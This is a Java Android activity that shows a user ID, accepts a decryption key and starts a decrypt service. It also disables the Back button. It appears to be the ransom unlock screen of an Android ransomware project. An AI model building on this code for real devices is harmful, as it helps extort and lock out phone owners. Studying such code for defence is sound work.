package alepacheco.com.rw.activityes;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.SystemClock;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import alepacheco.com.rw.R;
import alepacheco.com.rw.apl.Helper;
import alepacheco.com.rw.persistence.LocalStorage;
import alepacheco.com.rw.services.DecryptService;
import alepacheco.com.rw.services.MyService;

/**
 * Created by joao on 05/07/2017.
 */

public class DecryptActivity extends Activity{

    private Button bt_decrypt;
    private EditText edt_key;
    private TextView txt_id;

    Context ctx;
    Boolean lock;

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_decrypt);
        this.ctx = this;
        initializeComponents();

        initializeBeavior();
    }

    private void initializeComponents(){
        this.bt_decrypt = (Button) findViewById(R.id.bt_decrypt);
        this.edt_key = (EditText) findViewById(R.id.edt_decrypt_key);
        this.txt_id = (TextView) findViewById(R.id.txt_id);

        txt_id.setText(String.format(getResources().getString(R.string.message_id),LocalStorage.getInstance(ctx).getByTag(LocalStorage.TAG_ID_USER)));
    }

    private void initializeBeavior(){
        lock = false;

        bt_decrypt.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String typedKey = edt_key.getText().toString();
                LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_TEMP_KEY,typedKey);
                decrypt();
            }
        });
    }

    private void decrypt(){
        if(!lock) {
            Helper.makeToast(ctx,ctx.getResources().getString(R.string.tryng_decrypt));
            Intent srv = new Intent(ctx, DecryptService.class);
            startService(srv);
            lock = true;
        }
    }

    @Override
    public void onBackPressed() {

    }
}
